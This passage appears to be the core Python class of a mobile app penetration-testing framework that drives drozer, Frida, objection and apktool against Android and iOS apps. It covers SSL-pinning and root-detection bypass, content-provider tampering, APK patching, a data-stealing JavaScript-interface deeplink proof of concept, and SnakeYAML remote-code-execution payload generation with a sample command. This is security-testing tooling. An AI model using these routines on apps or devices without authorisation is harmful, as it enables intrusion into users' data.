import multiprocessing
import os
from pathlib import Path
import re
from asyncio.subprocess import DEVNULL
import shutil
import subprocess
from subprocess import PIPE
import threading
import warnings
from colorama import Fore
import readline
import shlex

from Classes.mmsf_drozer import drozer
from Classes.commands import Commands
from Classes.constants import Constants
from Classes.mmsf_apktool import apktool
from Classes.mmsf_frida import Frida
from Classes.mmsf_objection import objection
from Classes.mmsf_reflutter import reflutter
from Classes.mmsf_nuclei import nuclei
from Classes.mmsf_other_tools import OtherTools
from Classes.utils import *
from modules import *

warnings.filterwarnings("ignore")
# Set the unbuffered output
os.environ.setdefault('PYTHONUNBUFFERED', '1')

class MassiveMobileSecurityFramework:
    id: str
    _drozer: drozer
    _frida: Frida
    _objection: objection
    _reflutter: reflutter
    _apktool: apktool
    _other_tools: OtherTools
    _device_type: str
    _nuclei:  nuclei

    @property
    def all_apps(self):
        return self._all_apps

    def __init__(self) -> None:
        self.__init_print()
        self.__check_prerequisites()
        self.__init_dirs()
        self.__init_frameworks()

    def __check_prerequisites(self):
        packages = ['apktool', Constants.UBERSIGNER.value, 'java', Constants.DROZER.value, 'reflutter', 'objection', 'frida', f'java -jar {os.path.join(Constants.DIR_UTILS_PATH.value, "abe.jar")}']
        not_installed = []
        for package in packages:
            try:
                print(Fore.YELLOW + f'[*] Initiating {package}' + Fore.RESET)
                subprocess.run(package.split(), stderr=DEVNULL, stdout=DEVNULL)
            except Exception:
                not_installed.append(package)
        for package in not_installed:
            print(Fore.RED + "[-] " + package + ' is not installed!' + Fore.RESET)
        if len(not_installed):
            print(Fore.RED + "Please use mmsfupdate first!" + Fore.RESET)
            quit_app()
        
    def is_ios(self):
        cmd = "frida-ps -U"
        p = subprocess.run(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode()
        if "springboard" in p.lower():
            print(Fore.BLUE + '[*] Detected iOS device' + Fore.RESET)
            self._device_type = 'iOS'
            return True
        self._device_type = 'android'
        return False
        
    def __init_frameworks(self):
        low_power_mode = False
        if not check_alive_devices():
            print(Fore.RED + "[-] No devices found!" + Fore.RESET)
            resp = str(input(Fore.YELLOW + "Do you want to continue without any device? You'll be limited in terms of capabilities! Y/N (default: N) " + Fore.RESET) or "N")
            if resp.lower() == 'n':
                print(Fore.RED + '[-] Exitting' + Fore.RESET)
                exit(1)
            else:
                low_power_mode = True
        if low_power_mode:
            print(Fore.YELLOW + "[*] Running in low power mode ..." + Fore.RESET)
        else:
            self._frida = Frida(low_power_mode)
            self._objection = objection(low_power_mode)
            if self.is_ios():
                return
            self._other_tools = OtherTools(low_power_mode)
            self._drozer = drozer(low_power_mode)
            self._apktool = apktool(low_power_mode)
            self._reflutter = reflutter(low_power_mode)        
            self._nuclei = nuclei(low_power_mode)
            print(Fore.BLUE + '[*] Detected Android device' + Fore.RESET)
            self._all_apps = self.get_all_apps()

        
    def __repr__(self) -> str:
        pass

    def __hash__(self) -> int:
        return hash(self.id)

    def __eq__(self, __o: object) -> bool:
        """Compare two class instances."""
        if __o.id == self.id:
            return True
        return False
    
    def __init_print(self):
        print(Fore.GREEN + '... MMSF Intializating ... ' + Fore.RESET)

    def __mkdir(self, path):
        if not os.path.isdir(path):
            try:
                print(Fore.YELLOW + "[*] Creating directories ... " + Fore.RESET)
                os.system(f"mkdir {path}")
            except OSError as e:
                print(Fore.LIGHTBLUE_EX + '[DEBUG] ' + e + Fore.RESET)

    def __init_dirs(self):
        for path in (Constants):
            if path.name.startswith('DIR_'):
                self.__mkdir(path.value)

    # methods
    # Get a list of all installed apps
    def get_all_apps(self) -> list:
        if self._device_type == 'iOS':
            return list()
        final_command = " ".join(self._drozer._drozer_cmd).split() + ['-c', Commands.FIND_APP.value['cmd'], '--debug']
        lines = subprocess.run(final_command, stdout=PIPE, stderr=DEVNULL).stdout.decode().splitlines()[2:]
        filtered = filter(lambda x: not x.lstrip().startswith('Attempting'), lines)
        return list(map(lambda x: x.split(" ")[0], filtered))

    # run all drozer scans
    def run_all(self, cmd, data):
        if data["full_path"]:
            self._drozer.config["full_path"] = data["full_path"]
        self._drozer.config["app_name"] = data["app_name"]
        self._drozer._regenerate()

        if cmd == "run":
            if self._drozer.config["app_name"]:
                self._drozer.run_all()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0
        elif cmd == "show":
            print_show_table([
                {"name": "OUTDIR", "value": self._drozer.config["full_path"], "description": "The directory where the scans will save the data. Default is ~/.mmsf/loot/drozer_scans/"},
                {"name": "APP_NAME", "value": self._drozer.config["app_name"], "description": "The name of the application to be scanned."}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    # run all drozer scans
    def run_manifest(self, cmd, data):
        if data["full_path"]:
            self._drozer.config["full_path"] = data["full_path"]
        self._drozer.config["app_name"] = data["app_name"]
        self._drozer._regenerate()

        if cmd == "run":
            if self._drozer.config["app_name"]:
                self._drozer.run_manifest()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0
        elif cmd == "show":
            print_show_table([
                {"name": "OUTDIR", "value": self._drozer.config["full_path"], "description": "The directory where the scan will save the data. Default is ~/.mmsf/loot/drozer_scans/"},
                {"name": "APP_NAME", "value": self._drozer.config["app_name"], "description": "The name of the application to be scanned."}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Find specific app using drozer
    def find_app(self, cmd, data) -> list:
        apps = data["apps"]
        self._drozer.config["find_app_query"] = data["query"]
        if cmd == "run":
            if self._drozer.config["find_app_query"]:
                self._drozer.find_app()

                # get details of specific app
                print(Fore.BLUE + "Want to find details of specific app? Enter the application name (press tab to autocomplete) or enter 'exit' to exit!" + Fore.RESET)
                while True:
                    def completer(text, state):
                        options = [i for i in apps if i.startswith(text)]
                        if state < len(options):
                            return options[state]
                        else:
                            return None

                    readline.parse_and_bind("tab: complete")
                    readline.set_completer(completer)
                    value = shlex.split(input('mmsf (find/details)> '))[0]
                    if value not in apps or value == "exit":
                        back()
                        return 0
                    final_command = self._drozer._drozer_cmd + ['-c', Commands.COMMAND_PACKAGEINFO.value["cmd"] + value, '--debug']
                    output = subprocess.run(final_command, stdout=PIPE, stderr=DEVNULL).stdout.decode()
                    print(Fore.GREEN + "Details: \n" + output + Fore.RESET)
                    return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0                 
        elif cmd == "show":
            print_show_table([{"name": "FILTER", "value": self._drozer.config["find_app_query"], "description": "The query used to find the apps."}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    # start activity using intent
    def start_activity(self, cmd, data):
        self._drozer.activity = data
        if cmd == "run":
            if self._drozer.activity["app_name"] and self._drozer.activity["component"]:
                self._drozer.start_activity()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0                 
        elif cmd == "show":
            print_show_table([{"name": "APP_NAME", "value": self._drozer.activity["app_name"], "description": "The package name: e.g. com.example.android"},
            {"name": "COMPONENT", "value": self._drozer.activity["component"], "description": "The exported component: e.g. com.example.com.MainActivity"},
            {"name": "EXTRA", "value": self._drozer.activity["extras"], "description": "The extra values to be passed to the intent: e.g. string url file:///etc/hosts", "required": False},
            {"name": "DATA_URI", "value": self._drozer.activity["deeplink"], "description": "The URI used to open the application as deeplink", "required": False},
            {"name": "ACTION", "value": self._drozer.activity["intent_action"], "description": "The intent action (may be custom actions: e.g. theAction): e.g. android.intent.action.VIEW", "required": False},
            {"name": "MIMETYPE", "value": self._drozer.activity["mimetype"], "description": "The mimetype passed to the intent", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # start activity using intent
    def send_broadcast(self, cmd, data):
        self._drozer.activity = data
        if cmd == "run":
            if (self._drozer.activity["app_name"] and self._drozer.activity["component"]) or self._drozer.activity["intent_action"]:
                self._drozer.send_broadcast()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0                 
        elif cmd == "show":
            print_show_table([
            {"name": "COMPONENT", "value": self._drozer.activity["app_name"]+ " " + self._drozer.activity["component"], "description": "The exported component: e.g. com.example.com com.example.com.BroadCastActivity", "required": False},
            {"name": "EXTRA", "value": self._drozer.activity["extras"], "description": "The extra values to be passed to the intent: e.g. string url file:///etc/hosts", "required": False},
            {"name": "DATA_URI", "value": self._drozer.activity["deeplink"], "description": "The URI used to open the application as deeplink", "required": False},
            {"name": "ACTION", "value": self._drozer.activity["intent_action"], "description": "The intent action (may be custom actions: e.g. theAction): e.g. android.intent.action.VIEW", "required": False},
            {"name": "MIMETYPE", "value": self._drozer.activity["mimetype"], "description": "The mimetype passed to the intent", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2   
       
    # Open DeepLinks
    def open_deeplink(self, cmd, data):
        self._other_tools._deeplink = data
        if cmd == "run":
            if self._other_tools._deeplink:
                self._other_tools.open_deeplink()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0                 
        elif cmd == "show":
            print_show_table([{"name": "DATA_URI", "value": self._other_tools._deeplink, "description": "The URI used to open the application as deeplink"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        self._other_tools.open_deeplink()

    # Sniff broadcast data
    def sniff_broadcast_data(self, cmd, data):
        self._drozer.sniff_data = data
        if cmd == "run":
            if self._drozer.sniff_data["intent_action"] or self._drozer.sniff_data["category"] or (self._drozer.sniff_data["authority"] and self._drozer.sniff_data["scheme"]):
                self._drozer.sniff_broadcast_data()
                return 1
            else:
                print(Fore.RED + "[-] Set any of the ACTION, CATEGORY or DATA values!" + Fore.RESET)
                return 0                 
        elif cmd == "show":
            print_show_table([{"name": "ACTION", "value": self._drozer.sniff_data["intent_action"] , "description": "The action to match the broadcast receiver: e.g. android.intent.action.BATTERY_CHANGED", "required": False},
            {"name": "CATEGORY", "value": self._drozer.sniff_data["category"], "description": "The category to match the broadcast receiver: e.g. android.intent.category.LAUNCHER", "required": False},
            {"name": "DATA_AUTHORITY", "value": self._drozer.sniff_data["authority"], "description": "The authority used in URI (HOST PORT): e.g. com.mwr.dz 31415", "required": False},
            {"name": "DATA_PATH", "value": self._drozer.sniff_data["path"], "description": "The path used in URI: e.g. /sensitive-data/", "required": False},
            {"name": "DATA_SCHEME", "value": self._drozer.sniff_data["scheme"], "description": "The scheme used in URI: e.g. scheme://", "required": False},
            {"name": "DATA_TYPE", "value": self._drozer.sniff_data["type"], "description": "The mimetype used in URI", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2


    # Query the content provider
    def query_provider(self, cmd, content):
        self._drozer.content_provider = content

        if cmd == "run":
            if self._drozer.content_provider["uri"]:
                self._drozer.query_provider()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "URI", "value": self._drozer.content_provider["uri"], "description": "The Content Provider URI to be tested."},
                {"name": "PROJECTION", "value": self._drozer.content_provider["projection"], "description": "The columns to SELECT, as in 'SELECT <projection> FROM table'.", "required": False},
                {"name": "SELECTION", "value": self._drozer.content_provider["selection"], "description": "The Condition to apply to the query, as in \"WHERE <condition>\". e.g. selection \"id=?\"", "required": False},
                {"name": "SELECTION-ARGS", "value": self._drozer.content_provider["selection_args"], "description": "The parameter to replace the '?' in the selection", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Insert Data in content provider
    def insert_provider(self, cmd, data):
        self._drozer.content_provider = data

        if cmd == "run":
            if self._drozer.content_provider["uri"] and self._drozer.content_provider["insert_values"]:
                self._drozer.insert_provider()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "URI", "value": self._drozer.content_provider["uri"], "description": "The Content Provider URI to be tested."},
                {"name": "INSERT_VALUES", "value": self._drozer.content_provider["insert_values"], "description": "The values required for insert. Choose between string, boolean, double, float, integer, long, short. e.g: string pass pass"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    # Update data in content provider
    def update_provider(self, cmd, data):
        self._drozer.content_provider = data
        if cmd == "run":
            if self._drozer.content_provider["uri"] and self._drozer.content_provider["update_values"] and self._drozer.content_provider["selection"] and self._drozer.content_provider["selection_args"]:
                self._drozer.update_provider()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "URI", "value": self._drozer.content_provider["uri"], "description": "The Content Provider URI to be tested."},
                {"name": "UPDATE_VALUES", "value": self._drozer.content_provider["update_values"], "description": "The values required for update. Choose between string, boolean, double, float, integer, long, short. e.g: --string pass pass"},
                {"name": "SELECTION", "value": self._drozer.content_provider["selection"], "description": "The Condition to apply to the query, as in \"WHERE <condition>\". e.g. selection \"id=?\""},
                {"name": "SELECTION_ARGS", "value": self._drozer.content_provider["selection_args"], "description": "The parameter to replace the '?' in the selection"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    # Read data using content provider
    def read_provider(self, cmd, data):
        self._drozer.content_provider = data
        if cmd == "run":
            if self._drozer.content_provider["uri"]:
                self._drozer.read_provider()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "URI", "value": self._drozer.content_provider["uri"], "description": "The Content Provider URI to be tested."}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Bypass SSL Pinning 
    def bypass_ssl_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                if self._device_type == 'iOS':
                    self._frida.bypass_ssl_ios()
                else:
                    self._frida.bypass_ssl()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def bypass_ssl_frida_v2(self, proxy_host, proxy_port, cert_pem):
        """Delegates to the httptoolkit multi-script SSL bypass stack."""
        if not self._frida.config.get("app"):
            print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
            return 0
        import threading
        threading.Thread(
            target=self._frida.bypass_ssl_v2,
            args=(proxy_host, proxy_port, cert_pem)
        ).start()
        return 1

    # Bypass SSL Network Config
    def bypass_network_config(self, cmd, data):
        self._apktool.config["path"] = data["path"]
        self._apktool.config["app"] = data["app"]
        if cmd == "run": 
            if self._apktool.config["app"]:
                if not self.__exists_apk():
                    self.pull_apk(self._apktool.config["app"])
                if not self.__is_decompiled():
                    self.__decompile_apk()
                self.__modify_network_config()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._apktool.config["app"], "description": "The application package: com.example.android"},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The location of the apk, default to ~/.mmsf/apks/", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def __is_decompiled(self):
        return os.path.isdir(os.path.join(self._apktool.config["path"], self._apktool.config["apk"]))

    def __exists_apk(self):
        return os.path.isfile(os.path.join(self._apktool.config['path'], self._apktool.config['apk']+ '.apk'))

    def __decompile_apk(self):
        print(Fore.GREEN + '[*] Decompiling apk..' + Fore.RESET)
        self._apktool._decompile_apk()

    def __modify_network_config(self):
        self._apktool._modify_network_config()

    def bypass_ssl_objection(self):
        self._objection.bypass_ssl_pinning()

    # Bypass ROOT detection using frida
    def bypass_root_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.bypass_root, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    def bypass_root_objection_android(self, cmd, data):
        self._objection._config["app"] = data["app"]
        if cmd == "run": 
            if self._objection._config["app"]:
                self._objection.bypass_root_detection_android()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._objection._config["app"], "description": "The application package name: com.example.android"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def generate_apk(self, cmd, data):
        self._apktool.config = data
        if cmd == "run": 
            if self._apktool.config["apk"]:
                self._apktool.generate_apk()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "DIR_NAME", "value": self._apktool.config["dir_name"], "description": "The directory that needs to be patched. Default: base", 'required': False},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The path where to save the apk. Default to: ~/.mmsf/loot/apks", "required": False},
                {"name": "APK", "value": self._apktool.config["apk"], "description": "The target output name. Default to: base", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def sign_apk(self, cmd, data):
        self._apktool.config = data
        if cmd == "run": 
            if self._apktool.config["in_apk"]:
                self._apktool.sign_apk()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "IN_APK", "value": self._apktool.config["in_apk"], "description": "The APK that needs to be signed. Default: base_usigned.apk", 'required': False},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The path where to save the apk. Default to: ~/.mmsf/loot/apks", "required": False},
                {"name": "OUT_APK", "value": self._apktool.config["out_apk"], "description": "The target output name. Default to: base_patched.apk", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def install_apk(self, cmd, data):
        self._apktool.config = data
        if cmd == "run": 
            if self._apktool.config["apk"]:
                print(Fore.GREEN + "[+] Installing apk.." + Fore.RESET)
                self._apktool.install_apk()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APK", "value": self._apktool.config["apk"], "description": "The APK that is going to be installed. Default: base_patched.apk", 'required': True},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The path where the apk is located. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Patch apk and sign
    def patch_apk(self, cmd, data):
        self._objection.config = data
        if self._objection.config["abi"] == "autodetect":
            self._objection.config["abi"] = self.get_architecture()
        if cmd == "run": 
            if self._objection.config["apk"]:
                self._objection.patch_apk()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APK", "value": self._objection.config["apk"], "description": "The APK that is going to be patched. Default: ~/.mmsf/loot/apks/base.apk", 'required': True},
                {"name": "ABI", "value": self._objection.config["abi"], "description": "The architecture of the target device. Default to: autodetect", "required": False},
                {"name": "NETWORK", "value": self._objection.config["network"], "description": "Include a network_security_config.xml file allowing for user added CA's to be trusted on Android 7+. Default to False", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Get the Device's arch
    def get_architecture(self):
        cmd = f"{Constants.ADB.value} shell getprop ro.product.cpu.abi"
        return subprocess.run(cmd.split(), stdout=PIPE, stderr=PIPE).stdout.decode().strip()

    # Pull apk from device
    def pull_apk(self):
        cmd_to_run = [Constants.ADB.value, 'shell', 'pm', 'path', self._apktool.config["app"]]
        output = subprocess.run(cmd_to_run, stderr=DEVNULL, stdout=PIPE).stdout.decode().splitlines()
        pattern = re.compile(r"package:(.*?\.apk)")
        if len(output) > 1:
            print(Fore.YELLOW + '[*] It seems like the app is a Split One. Continue downloading the base.apk. For complete APK use splitapk module'  + Fore.RESET)
        for line in output:
            file_path = pattern.findall(line)[0]
            file_name = os.path.splitext(os.path.basename(file_path))
            if self._apktool.config["apk"].startswith("base"):
                self._apktool.config["apk"] = file_name[0]
            self._apktool.reconfigure()
            pull_cmd = [Constants.ADB.value, 'pull', file_path, os.path.join(self._apktool.config["path"], self._apktool.config["apk"])]
            p = subprocess.run(pull_cmd, stdout=PIPE, stderr=PIPE)
            print(Fore.GREEN + '[+] Pulling apk...' + Fore.RESET)
            print(Fore.GREEN + '[+] ' +  p.stdout.decode().strip() + Fore.RESET)
            print(Fore.GREEN + f'[+] Data pulled successfully to {self._apktool.config["path"]}' + Fore.RESET)
            return
        print(Fore.RED + '[-] The application does not exist. Try again' + Fore.RESET)
                
    def getapk(self, cmd, data):
        self._apktool.config = data
        if cmd == "run": 
            if self._apktool.config["app"]:
                threading.Thread(target=self.pull_apk, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._apktool.config["app"], "description": "The application name: MyApplication"},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The path where to save the apk. Default to: ~/.mmsf/loot/apks", "required": False},
                {"name": "APK", "value": self._apktool.config["apk"], "description": "The target output name. Default to: base", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    def workprofile_getapk(self, cmd, data):
        self._apktool.config["app"] = data["app"]
        self._apktool.config["path"] = data["path"]
        self._apktool.config["apk"] = data["apk"]

        if cmd == "run": 
            if self._apktool.config["app"]:
                self._apktool.install_as_normal_user()
                threading.Thread(target=self.pull_apk, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._apktool.config["app"], "description": "The application name: MyApplication"},
                {"name": "PATH", "value": self._apktool.config["path"], "description": "The path where to save the apk. Default to: ~/.mmsf/loot/apks", "required": False},
                {"name": "APK", "value": self._apktool.config["apk"], "description": "The target output name. Default to: base", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def extract_backup(self, cmd, data):
        self._other_tools.config = data
        if cmd == "run": 
            if self._other_tools.config["app"]:
                threading.Thread(target=self._other_tools.extract_backup, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._other_tools.config["app"], "description": "The application package name: com.example.android"},
                {"name": "PATH", "value": self._other_tools.config["path"], "description": "The path where to save the backup. Default to: ~/.mmsf/loot/data/", "required": False},
                {"name": "PASSWORD", "value": self._other_tools.config["password"], "description": "The password used for backup encryption. Default to: None", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def restore_backup(self, cmd, data):
        self._other_tools.config = data
        if cmd == "run": 
            if self._other_tools.config["app"]:
                threading.Thread(target=self._other_tools.restore_backup, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._other_tools.config["app"], "description": "The application package name: com.example.android"},
                {"name": "PATH", "value": self._other_tools.config["path"], "description": "The path where the backup is located. Default to: ~/.mmsf/loot/data/", "required": False},
                {"name": "PASSWORD", "value": self._other_tools.config["password"], "description": "The password used for backup encryption. Default to: None", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def generate_jsinterface(self, cmd, data):
        self._other_tools._generate_deeplink_data = data
        if cmd == "run": 
            if self._other_tools._generate_deeplink_data["server"] and self._other_tools._generate_deeplink_data["scheme"] and self._other_tools._generate_deeplink_data["package"] and self._other_tools._generate_deeplink_data["component"] and self._other_tools._generate_deeplink_data["deeplink_uri"] and self._other_tools._generate_deeplink_data["param"] and self._other_tools._generate_deeplink_data["js_interface"]:
                threading.Thread(target=self._other_tools.generate_jsinterface, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "SERVER", "value": self._other_tools._generate_deeplink_data["server"], "description": "The server you are using to host the files. Default to: http://127.0.0.1:8000"},
                {"name": "FILENAME", "value": self._other_tools._generate_deeplink_data["filename"], "description": "The file name. Default to: steal.html", "required": False},
                {"name": "SCHEME", "value": self._other_tools._generate_deeplink_data["scheme"], "description": "The deeplink's scheme."},
                {"name": "PACKAGE", "value": self._other_tools._generate_deeplink_data["package"], "description": "The application package name: com.example.android"},
                {"name": "COMPONENT", "value": self._other_tools._generate_deeplink_data["component"], "description": "The vulnerable activity. e.g. com.example.android/.WebViewActivity"},
                {"name": "DEEPLINK_URI", "value": self._other_tools._generate_deeplink_data["deeplink_uri"], "description": "The deeplink URI."},
                {"name": "PARAM", "value": self._other_tools._generate_deeplink_data["param"], "description": "The deeplink's vulnerable parameter."},
                {"name": "JS_INTERFACE", "value": self._other_tools._generate_deeplink_data["js_interface"], "description": "The vulnerable JavaScript Interface in form of AndroidInterfaceName.getUserSession()"},
                {"name": "PATH", "value": self._other_tools._generate_deeplink_data["path"], "description": "The path where to store the files. Default to: ~/.mmsf/loot/", "required": False},
                {"name": "POC_FILENAME", "value": self._other_tools._generate_deeplink_data["poc_filename"], "description": "The POC filename. Default to: launch.html", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def generate_malicious_poc(self, cmd, data):
        self._other_tools.snake_data = data
        if cmd == "run": 
            if data["type"]:
                threading.Thread(target=self._other_tools.generate_snakeyml_payload, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "TYPE", "value": self._other_tools.snake_data["type"], "description": "The type of exploit to use. Choose from write_to_sd, exec_cmd, and oob", "required": True},
                {"name": "FILENAME", "value": self._other_tools.snake_data["filename"], "description": "The file name. Default to: snake_poc.yml", "required": False},
                {"name": "PATH", "value": self._other_tools.snake_data["path"], "description": "The path where to save the file. Default to: ~/.mmsf/loot/", "required": True},
                {"name": "MAL_URL", "value": self._other_tools.snake_data["mal_url"], "description": "If type set to oob, set the URL as: http://localhost:8080/", "required": True},
                {"name": "CMD", "value": self._other_tools.snake_data["cmd"], "description": "If type set to exec_cmd, set the value as: touch /sdcard/command-executed.txt && echo \'RCE successful\' > /sdcard/command-executed.txt", "required": True},
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def execute_malicious_poc(self, cmd, data):
        self._other_tools.snake_data = data
        if cmd == "run": 
            if data["exec_mode"]:
                if data["exec_mode"] == "push_to_sd":
                    threading.Thread(target=self._other_tools.execute_snakeyml_payload, args=([])).start()
                    return 1
                elif data["exec_mode"] == "launch_deeplink":
                    if data["app_name"] and data["component"]:
                        threading.Thread(target=self._other_tools.execute_snakeyml_payload, args=([])).start()
                        return 1
                    else:
                        print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                        return 0      
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "EXEC_MODE", "value": self._other_tools.snake_data["exec_mode"], "description": "The type of exploit to use. Choose from push_to_sd, and launch_deeplink", "required": True},
                {"name": "FILENAME", "value": self._other_tools.snake_data["filename"], "description": "The file name. Default to: snake_poc.yml", "required": False},
                {"name": "PATH", "value": self._other_tools.snake_data["path"], "description": "The path where to save the file. Default to: ~/.mmsf/loot/", "required": False},
